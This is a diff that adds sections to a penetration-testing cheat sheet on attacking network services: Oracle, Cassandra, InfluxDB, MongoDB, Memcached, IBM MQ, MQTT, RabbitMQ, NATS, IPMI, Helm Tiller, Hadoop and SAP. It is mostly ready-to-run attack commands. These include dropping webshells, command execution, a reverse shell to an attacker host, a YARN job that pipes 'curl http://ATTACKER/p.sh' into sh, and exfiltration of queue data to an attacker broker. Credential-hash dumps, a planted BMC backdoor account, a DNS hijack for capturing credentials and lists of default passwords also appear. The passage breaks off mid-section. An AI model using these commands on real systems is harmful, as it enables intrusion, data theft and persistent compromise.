@@ -1607,6 +1607,1188 @@ static upload and reach PHP without touching 9000 directly.
 
 ---
 
+
+## Oracle TNS Listener enumeration and DB code execution (port 1521)
+
+Oracle DB fronts its RDBMS with the TNS Listener, usually on 1521/TCP (secondary listeners land on 1522-1529). The listener leaks version, can be brute-forced for the SID (database name), and once you have a SID plus valid creds the DB itself gives file read/write and OS command execution. `odat` (Oracle Database Attacking Tool) automates the whole chain; `tnscmd10g` and nmap NSE do the light-touch banner and version work.
+
+### Enumeration
+```bash
+# Version + listener status (no creds)
+nmap -p1521 -sV --script "oracle-tns-version,oracle-sid-brute" <IP>
+tnscmd10g version -h <IP>
+tnscmd10g status  -h <IP>
+
+# odat one-shot: runs every enum + attack module against the listener
+odat all -s <IP> -p 1521
+
+# SID brute (database name is required to auth)
+odat sidguesser -s <IP> -p 1521
+odat tnscmd -s <IP> --version           # ask the listener directly
+
+# Credential brute once a SID is known
+odat passwordguesser -s <IP> -p 1521 -d <SID> --accounts-file accounts_multiple.txt
+```
+
+### Exploitation / Attacks
+```bash
+# With a valid SID + creds, sqlplus gives a direct shell into the DB
+sqlplus <user>/<pass>@<IP>:1521/<SID>
+
+# Arbitrary file READ from the DB host (UTL_FILE / external tables)
+odat utlfile   -s <IP> -d <SID> -U <user> -P <pass> --getFile /path ./local
+odat externaltable -s <IP> -d <SID> -U <user> -P <pass> --getFile /etc /etc/passwd out
+
+# Arbitrary file WRITE (drop a webshell into a served dir)
+odat utlfile   -s <IP> -d <SID> -U <user> -P <pass> --putFile /var/www/html sh.jsp ./sh.jsp
+
+# OS command execution via DBMS_SCHEDULER / Java / external table
+odat dbmsscheduler -s <IP> -d <SID> -U <user> -P <pass> --exec "/bin/bash -c 'id'"
+odat externaltable -s <IP> -d <SID> -U <user> -P <pass> --exec /tmp cmd.sh
+```
+
+### Notable CVEs
+- CVE-2012-1675 (TNS Listener Poison / "TNS Poison"): pre-12c listeners let a remote unauthenticated attacker register a rogue instance and MITM/hijack DB sessions. `odat` and the msf `tnspoison` module test it.
+
+---
+
+## Cassandra unauthenticated enumeration and credential-hash dump (port 9042)
+
+Apache Cassandra is a distributed NoSQL store on 9042 (native protocol) and legacy 9160 (Thrift). It very often ships with authentication disabled or accepting any credentials, so an unauthenticated CQL session can enumerate keyspaces and read the `system_auth` tables that hold role credential hashes.
+
+### Enumeration
+```bash
+# nmap gathers little beyond version
+nmap -sV --script cassandra-info -p 9042 <IP>
+
+# cqlsh is the native client (pip install cqlsh); no/any creds often accepted
+cqlsh <IP> 9042
+cqlsh <IP> 9042 -u cassandra -p cassandra   # default super-user cassandra:cassandra
+```
+
+### Exploitation / Attacks
+```sql
+-- Cluster + version fingerprint
+SELECT cluster_name, release_version, native_protocol_version, data_center FROM system.local;
+
+-- Enumerate keyspaces, then describe the one you want
+SELECT keyspace_name FROM system_schema.keyspaces;
+DESC system_auth;
+
+-- Dump role rows: system_auth.roles holds bcrypt hashes of every DB role
+SELECT * FROM system_auth.roles;
+SELECT * FROM system_auth.role_permissions;
+
+-- Application keyspaces frequently hold app creds / tokens
+SELECT * FROM logdb.user_auth;
+SELECT * FROM configuration."config";
+```
+Crack the recovered bcrypt hashes offline with hashcat (`-m 3200`) and reuse against the cluster or other services.
+
+---
+
+## InfluxDB unauthenticated time-series dump and auth bypass (port 8086)
+
+InfluxDB is a time-series DB serving its HTTP API on 8086. Legacy 1.x instances frequently run with auth disabled, so `/query` and `/write` are open for reading, dumping, or even creating admin users. 2.x uses token auth; a leaked token gives full org/bucket enumeration.
+
+### Enumeration
+```bash
+# Version fingerprint (v1 vs v2)
+curl -si http://<IP>:8086/ping        # v1: 204 + X-Influxdb-Version header
+curl -s  http://<IP>:8086/health | jq # v2: JSON version + status, no auth needed
+
+# v1 CLI shell (unauth attempt)
+influx -host <IP> -port 8086
+
+# msf enum module
+msf6 > use auxiliary/scanner/http/influxdb_enum
+```
+
+### Exploitation / Attacks
+```bash
+# v1 unauth data dump over HTTP API (InfluxQL)
+curl -sG "http://<IP>:8086/query" --data-urlencode "q=SHOW DATABASES"
+curl -sG "http://<IP>:8086/query" --data-urlencode "q=SHOW USERS"
+curl -sG "http://<IP>:8086/query" --data-urlencode "db=telegraf" --data-urlencode "q=SHOW MEASUREMENTS"
+curl -sG "http://<IP>:8086/query" --data-urlencode "db=telegraf" --data-urlencode 'q=SELECT * FROM "cpu" LIMIT 5' | jq .
+# (table names sometimes must be double-quoted: SELECT * FROM "cpu")
+
+# If auth is disabled, create your own admin user
+curl -sG "http://<IP>:8086/query" --data-urlencode "q=CREATE USER hacker WITH PASSWORD 'P@ssw0rd!' WITH ALL PRIVILEGES"
+
+# v2 with a stolen token: enumerate orgs/buckets and query with Flux
+TOKEN="<token>"
+curl -s -H "Authorization: Token $TOKEN" http://<IP>:8086/api/v2/organizations | jq .
+curl -s -H "Authorization: Token $TOKEN" 'http://<IP>:8086/api/v2/buckets?limit=100' | jq .
+curl -s -H "Authorization: Token $TOKEN" -H 'Content-Type: application/vnd.flux' -X POST \
+  http://<IP>:8086/api/v2/query --data 'from(bucket:"telegraf") |> range(start:-1h) |> limit(n:5)'
+```
+
+### Notable CVEs
+- CVE-2019-20933: InfluxDB 1.x (< 1.7.6) JWT authentication bypass when the shared secret is empty; a forged token grants full admin. PoC: `LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933`.
+- CVE-2024-30896: InfluxDB OSS 2.x through 2.7.11 operator-token exposure; a low-priv token in the default org can list `/api/v2/authorizations` and recover the instance-wide operator token, then admin everything.
+
+---
+
+## AWS Redshift Postgres-wire warehouse attack (port 5439)
+
+Amazon Redshift is a managed data warehouse speaking a lightly modified PostgreSQL wire protocol on 5439, so Postgres tooling (psql, psycopg2, JDBC/ODBC) works; see the Postgres notes for generic wire behaviour. Redshift-specific gotchas are TLS enforcement, IAM auth, and driver metadata SQLi. Keep this short: enumeration/SQL is Postgres-identical.
+
+### Enumeration
+```bash
+# TLS is usually required; force sslmode=require
+psql "host=<endpoint> port=5439 user=awsuser dbname=dev sslmode=require" -c 'select version();'
+# \l \du list dbs/users; svv_redshift_sessions and pg_user enumerate identities
+psql "host=<endpoint> user=<u> dbname=dev sslmode=require" -c 'select * from pg_user;'
+# Bad-password vs missing-user errors differ -> username enumeration during spraying
+```
+
+### Exploitation / Attacks
+```bash
+# IAM auth: mint short-lived creds if you hold IAM keys with redshift:GetClusterCredentials
+aws redshift get-cluster-credentials --cluster-identifier <id> --db-user pentest --db-name dev --duration-seconds 900
+psql "host=<endpoint> user=pentest password=<token> dbname=dev sslmode=require"
+
+# Master user (often awsuser) can COPY from attacker S3, UNLOAD to exfil, and run Python UDFs (in-cluster code exec, legacy clusters)
+```
+```python
+# Driver metadata SQLi (CVE-2024-12744/5/6): unquoted user input in getTables/getSchemas/getColumns
+import redshift_connector
+cur = redshift_connector.connect(host='<endpoint>', database='dev', user='lowpriv', password='pw').cursor()
+cur.get_tables(table_schema='public', table_name_pattern="%' UNION SELECT usename,passwd FROM pg_user--")
+```
+
+### Notable CVEs
+- CVE-2024-12744 / -12745 / -12746: Redshift JDBC 2.1.0.31, Python connector 2.1.4, ODBC 2.1.5.0 build metadata queries with unquoted user-controlled catalog/pattern args; an app that passes attacker input into the metadata API runs arbitrary SQL as the connector's DB user.
+
+---
+
+## HSQLDB default sa login to Java-routine RCE (port 9001)
+
+HSQLDB (HyperSQL) is a Java SQL database; in server mode it listens on 9001/TCP. It is usually found bound to localhost after another service is popped, so treat it as a privesc pivot. Default creds are `sa` with a blank password, and HSQLDB lets you register Java Language Routines that call arbitrary static JDK methods, which turns SQL access into file read/write and code execution.
+
+### Enumeration
+```bash
+# nmap labels it "HSQLDB JDBC"
+nmap -sV -p9001 <IP>
+
+# Hunt for the DB name + creds in any code you already have on the host
+grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
+
+# Connect with the bundled Java client (extract hsqldb.jar, run SqlTool or the GUI)
+java -jar hsqldb.jar   # connect URL: jdbc:hsqldb:hsql://<IP>/<DBNAME>  user sa, blank pass
+```
+
+### Exploitation / Attacks
+```sql
+-- Read Java system properties by mapping java.lang.System.getProperty as a function
+CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
+  DETERMINISTIC NO SQL EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty';
+VALUES(getsystemproperty('user.name'));
+
+-- Write a file to disk via a JDK gadget already on the classpath (max 1024 bytes)
+CREATE PROCEDURE writetofile(IN path VARCHAR, IN data VARBINARY(1024))
+  LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
+  'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename';
+-- hex-encode a JSP/JSP webshell payload and drop it under a served path
+CALL writetofile('/path/ROOT/shell.jsp', CAST ('3c254020...' AS VARBINARY(1024)));
+```
+Any static JDK method returning an SQL-compatible primitive can be wrapped as a `FUNCTION` (called with `VALUES`); void methods become a `PROCEDURE` (called with `CALL`). The class must already be on the app classpath.
+
+---
+
+## Memcached unauthenticated cache dump (port 11211)
+
+Memcached is a distributed in-memory key/value cache on 11211. It supports SASL but is almost always exposed with no auth, so anyone who reaches the port can list slabs, enumerate keys, and read cached data (session tokens, query results, credentials). Data is volatile, so dump promptly.
+
+### Enumeration
+```bash
+# Raw protocol over nc: version, stats, slabs, and per-slab item counts
+echo "version"      | nc -vn -w1 <IP> 11211
+echo "stats"        | nc -vn -w1 <IP> 11211
+echo "stats slabs"  | nc -vn -w1 <IP> 11211
+echo "stats items"  | nc -vn -w1 <IP> 11211
+
+# libmemcached-tools: cleaner enumeration
+memcstat --servers=<IP>            # stats
+memcdump --servers=<IP>            # dump all key names
+
+# nmap + msf
+nmap -sV --script memcached-info -p 11211 <IP>
+msf6 > use auxiliary/gather/memcached_extractor   # pulls saved data
+```
+
+### Exploitation / Attacks
+```bash
+# Legacy (<1.4.31): dump keys per slab class, then GET each key
+echo "stats cachedump <slab_class> 0" | nc -vn -w1 <IP> 11211   # 0 = unlimited
+echo "get <item_name>"                | nc -vn -w1 <IP> 11211
+
+# Modern (1.4.31+): non-blocking full key metadump
+echo 'lru_crawler metadump all' | nc <IP> 11211
+
+# Bulk read discovered keys
+memccat --servers=<IP> <key1> <key2> <key3>
+
+# Poison cache entries (write attacker data) to influence downstream apps
+printf 'set session_admin 0 3600 4\r\ntrue\r\n' | nc -vn -w1 <IP> 11211
+```
+
+### Notable CVEs
+- CVE-2018-1000115: exposed UDP/11211 allows massive reflection/amplification DDoS (Memcrashed). Confirm with `msf auxiliary/scanner/memcached/memcached_amp`; disable UDP or firewall the port.
+
+---
+
+## MongoDB unauthenticated access and enumeration (port 27017)
+
+MongoDB is a document NoSQL store on 27017/27018 that by default requires no password, so the first test is always an anonymous connection. For NoSQL operator/injection payloads against apps talking to Mongo, see [[nosql]]; this section focuses on direct unauthenticated access, enumeration, and the no-auth default.
+
+### Enumeration
+```bash
+# Anonymous connection (mongo legacy or mongosh)
+mongosh mongodb://<IP>:27017
+mongo <IP>:<PORT>/<DB>
+
+# nmap runs all mongo scripts by default; mongodb-brute checks if creds are needed
+nmap -sV --script "mongo* and default" -p 27017 <IP>
+nmap -n -sV --script mongodb-brute -p 27017 <IP>
+```
+```python
+from pymongo import MongoClient
+client = MongoClient("<IP>", 27017)      # no creds
+print(client.server_info())
+for db in client.list_databases():
+    print(db["name"], client[db["name"]].list_collection_names())
+```
+
+### Exploitation / Attacks
+```javascript
+// Once connected, enumerate and dump collections
+show dbs
+use <db>
+show collections
+db.<collection>.find()          // dump every document
+db.users.find({"username":"admin"})
+
+// admin is a common DB; if reachable, dump credentials/tokens stored there
+```
+```bash
+# If auth is enabled but you have root on the host, disable it and reconnect free
+# set noauth = true (or remove security.authorization) in mongod.conf / bitnami mongodb.conf, then restart
+grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#"
+
+# Predictable 12-byte ObjectIDs (timestamp+machine+pid+counter) enable IDOR guessing
+# https://github.com/andresriancho/mongo-objectid-predict
+```
+
+### Notable CVEs
+- CVE-2025-14847 (MongoBleed): unauthenticated pre-auth heap memory disclosure in MongoDB 3.6 through 8.2 when the zlib network compressor is enabled. `OP_COMPRESSED` trusts an attacker-supplied `uncompressedSize`, so the server over-allocates and echoes uninitialized heap (creds, tokens) back in error responses; omitting the BSON `\x00` terminator makes the parser walk the oversized buffer. Check with `db.adminCommand({getParameter:1, networkMessageCompressors:1})`; PoC `joe-desimone/mongobleed`.
+
+---
+
+## IBM MQ message tampering and MQSC command execution (port 1414)
+
+IBM MQ is a message broker exposing its native listener on 1414/TCP, often with an MQ Console / REST API on 9443 and Prometheus metrics on 9157. Beyond queues and channels, PCF/MQSC access lets you create a SERVICE that runs an OS command with `mqm` authority, so a reachable server-connection channel is a path to RCE. `punch-q` (wraps `pymqi`) drives it; the REST API on 9443 gives the same primitives over HTTPS.
+
+### Enumeration
+```bash
+# punch-q (Docker) discovers queue-manager name, channels, users
+sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 discover name
+sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 --username admin --password passw0rd discover channels
+# some instances accept UNAUTHENTICATED MQ requests -> drop --username/--password
+sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 discover users --channel DEV.ADMIN.SVRCONN
+
+# If 1414 is filtered, try the web console/REST on 9443 (MQWebAdmin for /admin, MQWebUser for /messaging)
+# CHLAUTH recon via REST to see how a remote user maps to MCAUSER
+curl -sku 'admin:passw0rd' -H 'ibm-mq-rest-csrf-token: x' -H 'Content-Type: text/plain;charset=utf-8' \
+  --data "DISPLAY CHLAUTH(DEV.ADMIN.SVRCONN) MATCH(RUNCHECK) CLNTUSER('admin') ADDRESS('10.10.10.10')" \
+  https://<IP>:9443/ibmmq/rest/v3/admin/action/qmgr/MYQUEUEMGR/mqsc
+```
+
+### Exploitation / Attacks
+```bash
+# Non-destructive message sniff / dump from queues (business data, creds)
+sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 -u admin -p passw0rd --channel DEV.ADMIN.SVRCONN messages dump
+
+# RCE: punch-q creates a SERVICE (StartCommand) -> runs an arbitrary program as mqm (async)
+sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 -u admin -p passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
+sudo docker run --rm -ti leonjza/punch-q --host <IP> --port 1414 -u admin -p passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i <ATTACKER> -p 4444
+
+# Same RCE over the 9443 REST API with DEFINE/START/DELETE SERVICE
+curl -sku 'admin:passw0rd' -H 'ibm-mq-rest-csrf-token: x' -H 'Content-Type: text/plain;charset=utf-8' \
+  --data "DEFINE SERVICE(HT) CONTROL(MANUAL) SERVTYPE(COMMAND) STARTCMD('/bin/sh') STARTARG('-c id >/tmp/mq.id')" \
+  https://<IP>:9443/ibmmq/rest/v3/admin/action/qmgr/MYQUEUEMGR/mqsc
+
+# Message theft/injection via the messaging REST API (no MQ client libs needed)
+curl -sku 'app:passw0rd' https://<IP>:9443/ibmmq/rest/v3/messaging/qmgr/MYQUEUEMGR/queue/DEV.QUEUE.1/message           # browse
+curl -sku 'app:passw0rd' -X DELETE -H 'ibm-mq-rest-csrf-token: x' https://<IP>:9443/.../queue/DEV.QUEUE.1/message      # destructive get
+```
+Loot CCDT/TLS client artifacts (`AMQCLCHL.TAB`, `mqclient.ini`, `*.kdb`, `*.sth`, `*.p12`, `MQCCDTURL`) from app servers/CI when channels demand SSL. Note default developer creds `admin:passw0rd` / `app:passw0rd` on the container image.
+
+---
+
+## MQTT (Mosquitto) broker topic sniffing and cross-tenant abuse (port 1883)
+
+MQTT is a lightweight IoT publish/subscribe protocol; Mosquitto brokers listen on 1883 (8883 for TLS). Authentication is optional and encryption is off by default, so a wildcard subscription (`#`) on an open broker taps every topic, and weak per-tenant topic ACLs let you publish to or read other tenants' devices.
+
+### Enumeration
+```bash
+# Subscribe to everything (open broker) and to broker internals
+mosquitto_sub -h <IP> -t "#"      -v      # all application topics
+mosquitto_sub -h <IP> -t '$SYS/#' -v      # broker stats/version
+
+# With creds (spray weak defaults: admin/admin, admin: empty, reused tokens)
+mosquitto_sub -h <IP> -p 1883 -V mqttv311 -i cid -u <user> -P <pass> -t "#" -v
+```
+No dedicated nmap enum beyond banner; CONNACK return code 0x00 = accepted, 0x05 = bad creds. `mqtt-pwn` / paho scripts automate connect-and-subscribe.
+
+### Exploitation / Attacks
+```bash
+# Cross-tenant control when ACLs are namespaced only by deviceId
+mosquitto_pub -h <IP> -V mqttv311 -u <user> -P <pass> \
+  -t "/ys/<victimDeviceId>/tx" \
+  -m '{"method":"Device.setState","params":{"state":{"power":"on"}}}'
+
+# Sparkplug B (OT/SCADA) passive recon: live node/device/metric map from birth traffic
+mosquitto_sub -h <IP> -p 1883 -t 'spBv1.0/#' -v
+mosquitto_sub -h <IP> -p 1883 -t 'STATE/#'   -v
+```
+MQTT is frequently reachable over WebSocket (`ws://`/`wss://` on paths like `/mqtt`, `/ws`, RabbitMQ `15675/ws`). Grep frontend bundles (`env.js`, main JS chunk) for `mqtt`, `wss://`, `clientId`, `username`, `password`, `token`; then test wildcard subscribe (`client/+/chat_session`, `client/#`) for a cross-tenant message tap using the npm `mqtt` client.
+
+---
+
+## AMQP / RabbitMQ broker enumeration, message hijack, and RCE sinks (ports 5671/5672)
+
+AMQP 0-9-1/1.0 is the RabbitMQ broker protocol on 5672 (5671 TLS); the HTTP management API sits on 15672. Default creds are `guest:guest` (loopback-only by default, but many Docker/IoT images disable that check). With any authenticated access you can sniff/replay messages, exfiltrate via a shovel, and if a downstream consumer feeds message bodies into a shell you get RCE.
+
+### Enumeration
+```bash
+nmap -sV -Pn -n -T4 -p 5672 --script amqp-info <IP>   # product/version/SASL mechanisms
+
+# Probe AMQPS cert chain + mutual-TLS requirement
+openssl s_client -alpn amqp -connect <IP>:5671 -tls1_3 -msg </dev/null
+
+# rabbitmqadmin v2 against the mgmt API on 15672
+rabbitmqadmin --host <IP> --port 15672 -u guest -p guest channels list --non-interactive
+```
+```python
+import amqp
+conn = amqp.connection.Connection(host="<IP>", port=5672, virtual_host="/")  # guest:guest default
+conn.connect(); print("SASL:", conn.mechanisms); print(conn.server_properties)
+```
+
+### Exploitation / Attacks
+```python
+# Silent message sniffing: bind a temp queue to a topic exchange with a broad routing key
+import pika
+ch = pika.BlockingConnection(pika.ConnectionParameters('<IP>',5672,'/',pika.PlainCredentials('user','pass'))).channel()
+ch.queue_declare(queue='loot', exclusive=True, auto_delete=True)
+ch.queue_bind(queue='loot', exchange='amq.topic', routing_key='#')     # or payments.*, audit.#
+for m,p,body in ch.consume('loot', inactivity_timeout=5):
+    if body: print(m.routing_key, body)
+# Stream queues (x-queue-type=stream) retain history: replay with arguments={'x-stream-offset':'first'}
+```
+```bash
+# Exfiltrate a queue to an attacker broker via a shovel
+rabbitmqadmin shovels declare_amqp091 --name loot \
+  --source-uri amqp://user:pass@<IP>:5672/%2f --destination-uri amqp://attacker:pw@vps:5672/%2f \
+  --source-queue transactions --destination-queue stolen
+
+# Consumer-side command injection: publish a probe if a worker runs message bodies (bash -c "$MSG")
+curl -u user:pass -H 'content-type: application/json' -X POST \
+  http://<IP>:15672/api/exchanges/%2F/amq.default/publish \
+  -d '{"properties":{},"routing_key":"update","payload":"id","payload_encoding":"string"}'
+```
+
+### Notable CVEs
+- CVE-2024-51988: RabbitMQ <= 3.12.10 skips the `configure` permission check on HTTP-API queue deletion; any authed user with only `read`/`write` on a vhost can delete arbitrary queues (DoS). `curl -k -u u:p -X DELETE https://<IP>:15672/api/queues/%2F/<queue>`.
+- CVE-2025-50200: RabbitMQ before 4.0.8/4.1.0 logs the full `Authorization` header (base64) when the mgmt API is hit with basic auth on a non-existent resource; with filesystem access, grep `/var/log/rabbitmq/rabbit@*.log` for `Authorization:` to recover other tenants' creds.
+
+---
+
+## NATS / JetStream plaintext credential capture and stream looting (port 4222)
+
+NATS is a high-performance text-protocol message bus on 4222/TCP. The server sends an `INFO {...}` JSON banner on connect; the client replies with a plaintext `CONNECT {"user":...,"pass":...}` frame. TLS and auth are optional, so internal deployments commonly run plaintext AUTH, and JetStream (persistent Streams) often retains log payloads containing credentials.
+
+### Enumeration
+```bash
+# Banner grab: version, auth_required, jetstream, tls_required
+nmap -p4222 -sV --script banner <IP>
+echo | nc <IP> 4222        # prints the INFO {...} line manually
+
+# Official CLI (go install github.com/nats-io/natscli/nats@latest)
+nats -s nats://<IP>:4222 rtt          # Authorization Violation if creds needed
+```
+
+### Exploitation / Attacks
+```bash
+# Plaintext CONNECT harvesting: if you can hijack the broker DNS name (stale AD record, dynamic-update ACL),
+# mirror the real INFO banner to every client and capture the user/pass frame with nc alone
+nsupdate <<< $'server <DC_IP>\nupdate add nats-svc.domain.local 60 A <ATTACKER_IP>\nsend'
+nc <REAL_NATS> 4222 | head -1 | nc -lnvp 4222   # replayed banner -> client sends plaintext CONNECT
+
+# With a recovered credential, loot JetStream streams (auth logs frequently hold plaintext AD creds)
+nats context add ctx -s nats://<IP>:4222 --user Dev_Account_A --password '<pass>'
+nats stream list --context ctx
+nats stream view logs.auth --context ctx     # {"user":"...","password":"...","ip":"..."}
+```
+Replay recovered AD creds against Kerberos-only services, e.g. `netexec smb <DC> -u USER -p PASS -k`, for lateral movement / domain compromise.
+
+## IPMI / BMC out-of-band hash disclosure and cipher-zero bypass (port 623/udp)
+
+IPMI is the out-of-band management plane on server Baseboard Management Controllers (BMC: iLO, iDRAC, IMM, ILOM, Supermicro). It runs on 623/udp (sometimes tcp) below the OS, so owning it means KVM/serial console, virtual media, and a persistent backdoor account independent of the host OS. High-value pivot: BMC compromise leads to host root via GRUB `init=/bin/sh` or virtual-CD rescue boot.
+
+### Enumeration
+```bash
+# Discover + fingerprint version
+nmap -n -sU -p 623 --script ipmi-version 10.0.0.0/24
+msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS 10.0.0.0/24; run; exit"
+```
+
+### Exploitation / Attacks
+```bash
+# RAKP hash disclosure: dump salted MD5/SHA1 password hash for any valid user, crack offline
+msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.0.0.22; run; exit"
+hashcat -m 7300 ipmi_rakp.hash rockyou.txt        # 7300 = IPMI2 RAKP HMAC-SHA1
+
+# Cipher-zero auth bypass: authenticate with ANY password against a valid user
+msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS 10.0.0.22; run; exit"
+apt-get install ipmitool
+ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P anything user list
+ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P anything user set password 2 NewPass1
+
+# Anonymous access (null user/pass default on many BMCs) -> reset a named account
+ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
+ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 NewPass1
+
+# Post-access: plant a persistent ADMINISTRATOR backdoor over the local interface (no auth)
+ipmitool user set name 4 backdoor; ipmitool user set password 4 backdoor; ipmitool user priv 4 4
+
+# Supermicro: clear-text creds stored on the BMC filesystem
+cat /nv/PSBlock /nv/PSStore
+```
+Default creds to try first: Dell iDRAC `root:calvin`, IBM IMM `USERID:PASSW0RD` (zero), Supermicro `ADMIN:ADMIN`, Oracle/Sun ILOM `root:changeme`, ASUS `admin:admin`. HP iLO randomizes an 8-char factory password (not static). See [[default-credentials]].
+
+### Notable CVEs
+- CVE-2013-4786: IPMI 2.0 RAKP protocol returns a salted password hash for any known username pre-auth, enabling offline cracking. Affects the IPMI 2.0 spec broadly (HP, Dell, Supermicro BMCs).
+- Cipher Zero auth bypass (Dan Farmer, no single CVE): IPMI 2.0 cipher suite 0 accepts any password for a valid user; found across HP/Dell/Supermicro BMCs.
+- CVE-2013-3623 / Supermicro UPnP (Intel SDK for UPnP 1.3.1) SSDP overflow on udp/1900 gives root on the BMC (`exploit/multi/upnp/libupnp_ssdp_overflow`).
+
+---
+
+## Helm 2 Tiller unauthenticated cluster-admin RCE (port 44134)
+
+Tiller is the in-cluster server component of Helm 2, listening on 44134/tcp, usually deployed in `kube-system` with a high-privilege service account and no authentication. Any pod (or reachable client) that can talk to Tiller can install a chart that grants the default service token cluster-admin, giving full Kubernetes cluster takeover. Cross-ref [[kubernetes-attacks]].
+
+### Enumeration
+```bash
+# From inside a compromised pod: find the Tiller service across namespaces
+kubectl get pods,services --all-namespaces | grep -i tiller
+kubectl get services -n kube-system | grep tiller     # tiller-deploy ... 44134/TCP
+
+# From the network
+nmap -sS -p 44134 <IP>
+
+# Talk to it with the Helm 2 client and confirm reachability
+helm --host tiller-deploy.kube-system:44134 version
+```
+
+### Exploitation / Attacks
+```bash
+# Install a chart that binds the default service account to cluster-admin
+git clone https://github.com/Ruil1n/helm-tiller-pwn
+helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
+
+# The chart's clusterrole.yaml + clusterrolebinding.yaml give ALL privileges to the
+# default token; now enumerate/read secrets/exec into any pod cluster-wide
+kubectl get secrets --all-namespaces
+kubectl auth can-i --list
+```
+No installed CLI beyond `helm`/`kubectl` is needed. From here pivot to reading every namespace's secrets and stealing service-account tokens ([[kubernetes-attacks]]).
+
+### Notable CVEs
+No dedicated CVE. This is a design exposure: Helm 2 Tiller ran without auth by default and was deprecated. Helm 3 removed Tiller entirely, so a 44134 listener implies an unmaintained Helm 2 install.
+
+---
+
+## Apache Hadoop unauthenticated WebHDFS/YARN RCE (ports 50070/9870, 8088)
+
+Hadoop is a distributed storage (HDFS) and compute (YARN/MapReduce) cluster. In the default config it runs with `security=off` (no authentication), so exposed web UIs and REST APIs allow arbitrary HDFS file read/write and full RCE via YARN job submission. Classic cryptominer target; treat any unauth Hadoop as cluster RCE.
+
+### Enumeration
+```bash
+# NSE scripts per port (Hadoop lacks a Metasploit module)
+nmap -p 50030 --script hadoop-jobtracker-info <IP>
+nmap -p 50070 --script hadoop-namenode-info <IP>       # NameNode / WebHDFS
+nmap -p 50075 --script hadoop-datanode-info <IP>
+nmap -p 50090 --script hadoop-secondary-namenode-info <IP>
+# Ports: 50070/9870 NameNode, 50075/9864 DataNode, 8088 YARN RM, 8042 NodeManager,
+#        8031/8032 YARN RPC (often still unauth), 14000 HttpFS
+```
+
+### Exploitation / Attacks
+```bash
+# WebHDFS arbitrary read/write by impersonating any user via user.name
+curl "http://<host>:50070/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"
+curl -L "http://<host>:50070/webhdfs/v1/etc/hadoop/core-site.xml?op=OPEN&user.name=hdfs"
+curl -X PUT -T ./payload \
+  "http://<host>:50070/webhdfs/v1/tmp/payload?op=CREATE&overwrite=true&user.name=hdfs"
+
+# YARN ResourceManager unauth RCE: submit a DistributedShell job running any command
+appid=$(curl -s -X POST http://<host>:8088/ws/v1/cluster/apps/new-application | \
+  python3 -c 'import sys,json;print(json.load(sys.stdin)["application-id"])')
+curl -s -X POST http://<host>:8088/ws/v1/cluster/apps -H 'Content-Type: application/json' -d '{
+  "application-id":"'"$appid"'","application-name":"pwn","application-type":"YARN",
+  "am-container-spec":{"commands":{"command":"/bin/bash -c \"curl http://ATTACKER/p.sh|sh\""}}}'
+# 8031/8032 RPC allow the same protobuf job submission unauth on older clusters -> RCE
+```
+
+### Notable CVEs
+- CVE-2023-26031: Hadoop 3.3.1-3.3.4 `container-executor` loads libs from a relative RUNPATH (`$ORIGIN/:../lib/native/`); a YARN-container user drops a malicious `libcrypto.so` and gets root when the SUID binary runs. Fixed 3.3.5. Check: `readelf -d /opt/hadoop/bin/container-executor | grep 'R.\?PATH'` and confirm SUID with `ls -l`.
+
+---
+
+## SAP NetWeaver / ERP default creds, SOAP RFC and ICM abuse (ports 3200-3300, 50000, 1128/1129)
+
+SAP is the ERP stack (NetWeaver ABAP/Java). Each instance splits into database, application and presentation layers; the database yields the most impact. Attack surface: SAP GUI (DIAG protocol, often unencrypted), the ICM/Web Dispatcher HTTP stack on 50000+, SAP Host Agent SOAP on 1128/1129, and the `/sap/bc/soap/rfc` service. Instance-number ports follow `32<NR>` dispatcher, `33<NR>` gateway, `5<NR>13`/`5<NR>14` sapstartsrv.
+
+### Enumeration
+```bash
+# Service/instance discovery
+msfconsole -qx "use auxiliary/scanner/sap/sap_service_discovery; set RHOSTS 192.168.96.101; run; exit"
+nmap -sV -p 3200-3300,50000-50100,1128,1129 <IP>
+
+# Unauth info disclosure (system id, kernel, DB, IP) -> build attack graph before login
+curl http://<IP>:50000/sap/public/info                          # RFC_SYSTEM_INFO SOAP dump
+curl "http://<IP>:1128/SAPHostControl/?wsdl"                     # Host Agent SOAP methods
+msfconsole -qx "use auxiliary/scanner/sap/sap_icf_public_info; set RHOSTS <IP>; run; exit"
+# ERPScan / pysap for custom NI/DIAG/RFC packet work
+git clone https://github.com/OWASP/pysap
+```
+
+### Exploitation / Attacks
+```bash
+# Default hardcoded creds (P1 on prod) - try first in SAP GUI / SOAP RFC
+#   SAP*:06071992  SAP*:PASS   DDIC:19920706   TMSADM:PASSWORD   EARLYWATCH:SUPPORT
+#   SOLMAN_ADMIN:init1234   SAPCPIC:ADMIN
+msfconsole -qx "use auxiliary/scanner/sap/sap_soap_rfc_brute_login; set RHOSTS <IP>; run; exit"
+
+# SOAP RFC command execution when the user is over-privileged
+msfconsole -qx "use exploit/multi/sap/sap_soap_rfc_sxpg_command_exec; set RHOSTS <IP>; run; exit"
+
+# ConfigServlet unauth RCE (old but common on SAP Portal / Java stack)
